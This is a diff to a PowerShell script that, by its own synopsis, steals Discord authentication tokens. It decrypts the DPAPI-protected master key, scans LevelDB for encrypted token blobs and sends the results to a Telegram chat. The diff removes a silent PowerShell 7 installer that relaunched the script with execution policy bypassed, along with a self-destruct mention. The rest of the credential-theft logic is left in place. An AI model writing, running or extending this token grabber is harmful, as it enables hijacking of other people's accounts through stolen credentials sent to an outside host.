@@ -1,9 +1,8 @@
 <#
 .SYNOPSIS
-    Extracts Discord authentication tokens and optionally sends them to a Telegram chat with enriched metadata, auto-installs PowerShell 7+, and self-destructs.
+    Extracts Discord authentication tokens and optionally sends them to a Telegram chat with enriched metadata.
 
 .DESCRIPTION
-    - Ensures PowerShell 7+ is installed; if not, installs and reruns under it.
     - Reads Discord’s encrypted Local State to retrieve the DPAPI-protected master key.
     - Decrypts the master key using Windows DPAPI.
     - Scans the LevelDB folder for AES-GCM–encrypted token blobs.
@@ -27,29 +26,6 @@ param(
     [Parameter(Mandatory)] [string] $chatId,
     [switch] $DryRun
 )
-
-function Install-PowerShell7 {
-    if ($PSVersionTable.PSVersion.Major -ge 7) { return }
-    Write-Host 'PowerShell 7+ not detected. Installing...'
-    if (Get-Command winget -ErrorAction SilentlyContinue) {
-        Write-Host 'Installing PowerShell 7 via winget...'
-        Start-Process winget -ArgumentList 'install','--id','Microsoft.Powershell','-e','--silent' -Wait
-    } else {
-        Write-Host 'Downloading PowerShell 7 MSI...'
-        $url = 'https://github.com/PowerShell/PowerShell/releases/latest/download/PowerShell-7.4.5-win-x64.msi'
-        $tmp = Join-Path $env:TEMP 'pwsh.msi'
-        Invoke-RestMethod -Uri $url -OutFile $tmp
-        Start-Process msiexec.exe -ArgumentList '/i', "`"$tmp`"", '/qn' -Wait
-        Remove-Item $tmp -Force
-    }
-    $pwshExe = (Get-Command pwsh -ErrorAction Stop).Source
-    Write-Host "Re-launching under $pwshExe..."
-    & $pwshExe -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @PSBoundParameters
-    exit
-}
-
-# Bootstrap PowerShell 7+
-Install-PowerShell7
 
 # Confirm environment
 if ($PSVersionTable.PSVersion.Major -lt 7 -or $env:OS -notmatch 'Windows') {
@@ -199,4 +175,5 @@ foreach ($dir in $installDirs) {
         }
     }
 }
+
 Write-Host 'No token found.'
